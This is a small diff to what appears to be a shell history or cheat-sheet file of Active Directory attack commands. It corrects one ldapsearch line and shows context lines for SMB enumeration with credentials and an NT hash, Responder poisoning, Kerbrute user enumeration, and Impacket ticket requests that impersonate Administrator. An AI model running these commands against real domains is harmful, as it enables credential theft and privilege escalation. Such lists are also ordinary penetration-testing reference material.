@@ -33,7 +33,7 @@
 : 1670248307:0;smbclient -L \\test.local -I 10.10.10.1 -U zach hunter2
 : 1670248307:0;smbclient -L \\10.10.10.1 -U zach.local/zach --pw-nt-hash XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX 
 : 1670248307:0;responder -I eth0 -A 
-: 1670248307:0;ldapsearch -LLL -x -H ldap://zach.local -b'' -s base '(objectclass=\*)'
+: 1670248307:0;ldapsearch -LLL -x -H ldap://zach.local -b '' -s base '(objectclass=*)' +
 : 1670248307:0;kerbrute userenum -d zach.local usernames.txt
 : 1670248307:0;python3 getTGT.py zach.local/zach -dc-ip 10.10.10.1 -hashes ':'
 : 1670248307:0;python3 getST.py -hashes ':' -spn www/server01.zach.local -dc-ip 10.10.10.1 -impersonate Administrator zach.local/zach 
